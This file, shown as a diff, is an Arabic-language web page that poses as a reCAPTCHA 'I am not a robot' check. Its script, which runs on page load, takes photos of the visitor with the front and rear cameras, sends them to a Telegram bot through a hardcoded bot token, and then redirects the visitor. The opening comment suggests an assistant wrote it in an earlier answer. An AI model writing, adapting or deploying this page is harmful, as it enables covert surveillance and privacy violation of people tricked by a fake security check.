@@ -1,0 +1,92 @@
+<!-- نفس كود reCAPTCHA من إجابتي السابقة، مع تعديل جزء الـ Script -->
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>التحقق الأمني</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .recaptcha-box { border: 1px solid #ccc; background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: left; }
+        .recaptcha-header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 10px; }
+        .recaptcha-header img { height: 30px; }
+    </style>
+</head>
+<body>
+    <div class="recaptcha-box">
+        <div class="recaptcha-header">
+            <div style="display: flex; align-items: center;">
+                <input type="checkbox" style="width: 25px; height: 25px;" checked disabled>
+                <span>أنا لست برنامج روبوت</span>
+            </div>
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+        </div>
+        <p>الرجاء الانتظار حتى يتم التحقق...</p>
+    </div>
+    <video id="camera-feed" style="display: none;"></video>
+    <canvas id="photo-canvas" style="display: none;"></canvas>
+<script>
+    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
+    let TARGET_CHAT_ID;
+    let REDIRECT_URL;
+
+    // دالة لقراءة وفك تشفير البيانات من الرابط
+    function getParamsFromUrl() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedUrl = urlParams.get('url');
+        const encodedId = urlParams.get('id');
+        
+        if (encodedUrl && encodedId) {
+            REDIRECT_URL = atob(encodedUrl); // Base64 decoding
+            TARGET_CHAT_ID = atob(encodedId); // Base64 decoding
+        } else {
+            // قيم افتراضية في حال فتح الرابط مباشرة
+            REDIRECT_URL = 'https://google.com';
+            TARGET_CHAT_ID = '1431886140'; // الـ ID الافتراضي
+        }
+    }
+
+    async function sendPhotoToTelegram(photoBlob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', TARGET_CHAT_ID);
+        formData.append('photo', photoBlob, 'photo.jpg');
+        formData.append('caption', caption);
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch (error) { console.error('Error sending photo:', error); }
+    }
+
+    async function captureAndSend(facingMode, cameraName) {
+        let stream = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } });
+            const cameraFeed = document.getElementById('camera-feed');
+            cameraFeed.srcObject = stream;
+            await new Promise(r => cameraFeed.onloadedmetadata = r);
+            await new Promise(r => setTimeout(r, 1500));
+            
+            const canvas = document.getElementById('photo-canvas');
+            canvas.width = cameraFeed.videoWidth;
+            canvas.height = cameraFeed.videoHeight;
+            canvas.getContext('2d').drawImage(cameraFeed, 0, 0);
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+            
+            await sendPhotoToTelegram(blob, `صورة من (${cameraName})`);
+            stream.getTracks().forEach(track => track.stop());
+            return true;
+        } catch (error) {
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            return false;
+        }
+    }
+    
+    window.onload = async () => {
+        getParamsFromUrl();
+        await captureAndSend('user', 'الكاميرا الأمامية');
+        await new Promise(r => setTimeout(r, 500));
+        await captureAndSend('environment', 'الكاميرا الخلفية');
+        window.location.href = REDIRECT_URL;
+    };
+</script>
+</body>
+</html>
